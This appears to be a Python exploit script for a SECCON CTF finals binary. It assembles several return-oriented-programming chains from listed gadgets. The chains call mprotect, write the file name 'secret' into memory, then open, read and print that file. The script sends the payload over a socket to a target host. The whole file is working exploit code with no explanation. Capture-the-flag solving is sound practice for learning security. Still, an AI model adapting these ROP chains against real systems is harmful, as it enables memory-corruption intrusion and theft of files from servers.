import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def send_msg(f, _str):
    f.write(p(len(_str)))
    f.write(_str)


#host = '3.finals.seccon.jp'
host = '192.168.165.134'
port = 20000

material_base = 0x10000000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
0x100e3e94: pop    %esi
0x100e3e95:  pop    %ebx
0x100e3e96:  pop    %edx
0x100e3e97:  ret    
'''

'''
.text:000C7B6C                 int     80h             ; LINUX - sys_read
.text:000C7B6E                 pop     ebx
.text:000C7B6F                 cmp     eax, 0FFFFF001h
.text:000C7B74                 jnb     short loc_C7BA3
.text:000C7B76                 retn
'''

'''
.text:000913A9                 mov     [edx], eax
.text:000913AB
.text:000913AB loc_913AB:                              ; CODE XREF: time+17j
.text:000913AB                 pop     ebp
.text:000913AC                 retn
'''

'''
.text:0010FF8D                 mov     eax, [eax]
.text:0010FF8F                 retn
'''

'''
0x8dae7
1: pop esi ; pop edi ; pop ebp ; ret  ;  
2: pop ebp ; ret  ; 
3: 
.text:0008DAE7                 mov     [edx+3], eax
.text:0008DAEA                 mov     eax, edx
.text:0008DAEC                 retn
4: pop edi ; ret  ;  

0xfe0fa
2: pop ebx; pop ebp; ret
4: pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ; 

0x1aa2
1 2 3 4: pop edx; ret
'''

'''
1: 0x00110123 retn 152
2: 0x0014368f retn 40
'''
syscall_mprotect = 125
syscall_read = 3
syscall_write = 4
syscall_open = 5

_3_ret = 0x33333333
_1_ret = 0x11111111
_2_ret = 0x22222222
_4_ret = 0x44444444

edx = 0xf7785100
rop = p(0x10001aa2)
rop += p(edx)
rop += p(0x1008dae7)
rop += p(_3_ret)
rop += p(0x100fe0fa)
rop += p(0x41414141)
rop += p(_1_ret)
rop += p(_2_ret)
rop += p(0x41414141)
rop += p(_4_ret)

# rop 4

rop4 = p(0x100effdf) # dca_ret
rop4 += p(0x7) # edx type
rop4 += p(0x1a9000) # ecx len
rop4 += p(syscall_mprotect) # eax: 125
rop4 += p(0x100EC356) # b_ret
rop4 += p(0x10000000) # ebx
rop4 += p(0x100EC351) # int 80
rop4 += p(0x41414141)
rop4 += p(0x41414141)
rop4 += p(0x41414141)
rop4 += p(0x10000000)
rop4 += p(0x1002E33C) # 
rop4 += p(0x10000000) # addr: edx
rop4 += p(0x100EFFE1) # 
rop4 += 'secr' # val: eax
rop4 += p(0x1004D1B2)
rop4 += p(0x1002E33C) # 
rop4 += p(0x10000004) # addr: edx
rop4 += p(0x100EFFE1) # 
rop4 += 'et\x00\x00' # val: eax
rop4 += p(0x1004D1B2)
rop4 += p(0x1002E33C)
rop4 += p(0x10000008) # addr: edx
rop4 += p(0x100EFFE1) # 
rop4 += '\xcd\x80\x5b\xc3' # val: eax (int 80h ; pop ebx ; ret ; )
rop4 += p(0x1004D1B2)
rop4 += p(0x100EFFDF)
rop4 += p(0x0) # edx
rop4 += p(0x0) # ecx
rop4 += p(syscall_open) # eax open
rop4 += p(0x10000008)
rop4 += p(0x0) # ebx
rop4 += p(0x100EFFDF)
rop4 += p(1024) # edx
rop4 += p(0x101a8700) # ecx
rop4 += p(syscall_read) # eax read
rop4 += p(0x10000008)
rop4 += p(0x1) # ebx
rop4 += p(0x100EFFDF)
rop4 += p(128) # edx
rop4 += p(0x101a8700) # ecx
rop4 += p(syscall_write) # eax write
rop4 += p(0x10000008)

# rop 3
rop3 = p(0x100F37DF) # dca_ret
rop3 += p(0x7) # edx type
rop3 += p(0x1a4000) # ecx len
rop3 += p(syscall_mprotect) # eax: 125
rop3 += p(0x100f66bb) # b_ret
rop3 += p(0x10000000) # ebx
rop3 += p(0x100ef791) # int 80
rop3 += p(0x41414141)
rop3 += p(0x41414141)
rop3 += p(0x41414141)
rop3 += p(0x10000000)
rop3 += p(0x100fd53b) # 
rop3 += p(0x10000000) # addr: edx
rop3 += p(0x1012b6a6) # 
rop3 += 'secr' # val: eax
rop3 += p(0x1004cac2)
rop3 += p(0x100fd53b) # 
rop3 += p(0x10000004) # addr: edx
rop3 += p(0x1012b6a6) # 
rop3 += 'et\x00\x00' # val: eax
rop3 += p(0x1004cac2)
rop3 += p(0x100fd53b) # 
rop3 += p(0x10000008) # addr: edx
rop3 += p(0x1012b6a6) # 
rop3 += '\xcd\x80\x5b\xc3' # val: eax
rop3 += p(0x1004cac2)
rop3 += p(0x100F37DF)
rop3 += p(0x0) # edx
rop3 += p(0x0) # ecx
rop3 += p(syscall_open) # eax open
rop3 += p(0x10000008)
rop3 += p(0x0) # ebx
rop3 += p(0x100F37DF)
rop3 += p(1024) # edx
rop3 += p(0x101a3d00) # ecx
rop3 += p(syscall_read) # eax read
rop3 += p(0x10000008)
rop3 += p(0x1) # ebx
rop3 += p(0x100F37DF)
rop3 += p(128) # edx
rop3 += p(0x101a3d00) # ecx
rop3 += p(syscall_write) # eax write
rop3 += p(0x10000008)

# rop 1
rop1 = p(0x100da1bf) # dca_ret
rop1 += p(0x7)
rop1 += p(0x14a000)
rop1 += p(syscall_mprotect)
rop1 += p(0x100e3ebe) # b_ret
rop1 += p(0x10000000)
rop1 += p(0x100e3eba) # int80_dcb_ret
rop1 += p(0x10000000)
rop1 += p(0x41414141) * 2
rop1 += p(0x100da1c1) # a_ret
rop1 += 'secr'
rop1 += p(0x10048CD2) # write
rop1 += p(0x41414141)
rop1 += p(0x100e3e96) # d_ret
rop1 += p(0x10000004)
rop1 += p(0x100da1c1) # a_ret
rop1 += 'et\x00\x00'
rop1 += p(0x10048CD2) # write
rop1 += p(0x41414141)
rop1 += p(0x100C76FA) # open
rop1 += p(0x100da1bf)
rop1 += p(0x10000000)
rop1 += p(0x0)
rop1 += p(0x0)
rop1 += p(0x100C7B5A) # read
rop1 += p(0x100da1bf)
rop1 += p(0x0)
rop1 += p(0x10149d00)
rop1 += p(1024)
rop1 += p(0x100C7BCA) # write
rop1 += p(0x41414141)
rop1 += p(0x1)
rop1 += p(0x10149d00)
rop1 += p(128)

# rop 2
rop2 = p(0x100da45f) # dca_ret
rop2 += p(0x7)
rop2 += p(0x14b000)
rop2 += p(syscall_mprotect)
rop2 += p(0x10078356) # b_ret
rop2 += p(0x10000000)
rop2 += p(0x100e46df) # int80_dcb_ret
rop2 += p(0x10000000)
rop2 += p(0x41414141) * 2
rop2 += p(0x10020193) # a_ret
rop2 += 'secr'
rop2 += p(0x10049442) # write
rop2 += p(0x41414141)
rop2 += p(0x10001aaa) # d_ret
rop2 += p(0x10000004)
rop2 += p(0x10020193) # a_ret
rop2 += 'et\x00\x00'
rop2 += p(0x10049442) # write
rop2 += p(0x41414141)
rop2 += p(0x100C666A) # open
rop2 += p(0x100da45f)
rop2 += p(0x10000000)
rop2 += p(0x0)
rop2 += p(0x0)
rop2 += p(0x100C6CCA) # read
rop2 += p(0x100da45f)
rop2 += p(0x0)
rop2 += p(0x1014ad00)
rop2 += p(1024)
rop2 += p(0x100C6D4A) # write
rop2 += p(0x41414141)
rop2 += p(0x1)
rop2 += p(0x1014ad00)
rop2 += p(128)

#rop += p(0x41414141) * 4

raw_input('wait')

send_msg(f, 'a' * 32)
send_msg(f, rop)

print f.read(1024)
print f.read(1024)
print f.read(1024)

'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''
